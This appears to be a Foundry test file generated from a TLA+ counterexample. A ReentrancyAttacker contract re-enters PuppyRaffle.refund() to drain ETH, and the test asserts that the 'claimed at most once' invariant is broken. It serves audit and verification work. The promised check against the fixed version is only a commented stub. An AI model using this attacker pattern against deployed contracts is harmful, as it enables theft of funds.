// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma abicoder v2;

// Universal Foundry test scaffold — emitted by plumbline tools/trace_to_forge.py
// from a TLA+ counterexample trace + a per-target manifest.
//
// Shape:       ReentrancyDrain
// Target:      PuppyRaffle (in src/PuppyRaffle.sol)
// TLA+ spec:   docs/tla/ReentrancyDrain.tla
// Invariant:   ClaimedAtMostOnce
//
// TLC counterexample trace head:
// State 0: slot=Live, paid=0, reentries=0
//   Action: PreCheckBuggy(e)
// State 1: slot=Calling, paid=TicketPrice, reentries=1
//   Action: ReenterBuggy(e)
// State 2: slot=Calling, paid=2*TicketPrice, reentries=2  -- INVARIANT VIOLATED
//
// What the test asserts: the invariant ClaimedAtMostOnce holds on the
// CEI-correct (fixed) version of PuppyRaffle.refund and
// is VIOLATED on the buggy version. The action sequence below replays
// the TLC trace exactly.

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public victim;
    uint256 public attackArg;
    uint256 public callsRemaining;
    uint256 public callsExecuted;
    constructor(PuppyRaffle _v) public {
        victim = _v;
    }

    function attack(uint256 _attackArg, uint256 _callDepth) external payable {
        attackArg = _attackArg; callsRemaining = _callDepth; callsExecuted = 0; victim.refund(_attackArg);
    }

    receive() external payable {
        if (callsRemaining > 0) { callsRemaining--; callsExecuted++; victim.refund(attackArg); }
    }
}

contract ReentrancyDrain_Universal is Test {
    PuppyRaffle public victim;
    ReentrancyAttacker public attacker;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        victim = new PuppyRaffle(ENTRANCE_FEE, address(0xBEEF), 1 weeks);
        attacker = new ReentrancyAttacker(victim);
        address[] memory players = new address[](1); players[0] = address(attacker);
        vm.deal(address(attacker), 100 ether);
        vm.prank(address(attacker)); victim.enterRaffle{value: ENTRANCE_FEE}(players);
        address[] memory honest = new address[](3); honest[0] = address(0x1); honest[1] = address(0x2); honest[2] = address(0x3);
        vm.deal(address(this), 10 ether);
        victim.enterRaffle{value: ENTRANCE_FEE * 3}(honest);
    }

    /// @notice replays TLC counterexample for invariant ClaimedAtMostOnce.
    ///         on the BUGGY version this asserts the invariant is violated.
    function test_ReentrancyDrain_invariantViolated() public {
        uint256 victimBefore = address(victim).balance;
        uint256 attackerBefore = address(attacker).balance;
        vm.prank(address(attacker)); attacker.attack(0, 1);
        uint256 victimAfter = address(victim).balance;
        uint256 attackerAfter = address(attacker).balance;
        emit log_named_uint('victim drained', victimBefore - victimAfter);
        emit log_named_uint('attacker gained', attackerAfter - attackerBefore);

        // Invariant check derived from TLA+ INVARIANT ClaimedAtMostOnce:
        assertGt(attacker.callsExecuted(), 0, 'ClaimedAtMostOnce: attacker must have re-entered at least once');
        assertGt(address(attacker).balance, ENTRANCE_FEE, 'ClaimedAtMostOnce VIOLATED: attacker walked away with > 1 ENTRANCE_FEE');
    }

    /// @notice fixed version of the same trace asserts the invariant HOLDS.
    ///         Skipped unless the target is patched; commented for reference.
    // function test_ReentrancyDrain_invariantHoldsOnFix() public { ... }
}
